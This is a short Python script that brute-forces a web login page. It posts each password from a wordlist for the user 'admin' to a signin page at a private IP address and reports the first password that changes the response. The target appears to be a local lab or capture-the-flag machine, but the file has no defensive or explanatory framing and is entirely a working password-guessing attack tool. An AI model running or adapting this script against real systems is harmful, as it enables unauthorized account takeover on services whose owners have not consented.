#!/usr/bin/env python3

import sys
import requests


class Brute:

    def __init__(self, url, user):
        self.url = url
        self.user = user
        self.wrong = requests.post(f"{ self.url }?page=signin&username=a&password=a&Login=Login#").text


    def run(self):
        print("Running...")
        with open('wordlist.txt') as wordlist:
            for passwd in wordlist.readlines():
                url = f"{ self.url }?page=signin&username={ self.user }&password={ passwd.strip() }&Login=Login#"
                # print(url)
                res = requests.post(url).text
                if res != self.wrong:
                    # print(res)
                    print(f"Done ! Password is [{ passwd.strip() }]")
                    sys.exit()
        print("Done. Nothing worked !")


if __name__ == '__main__':
    Brute(url='http://192.168.56.103/', user='admin').run()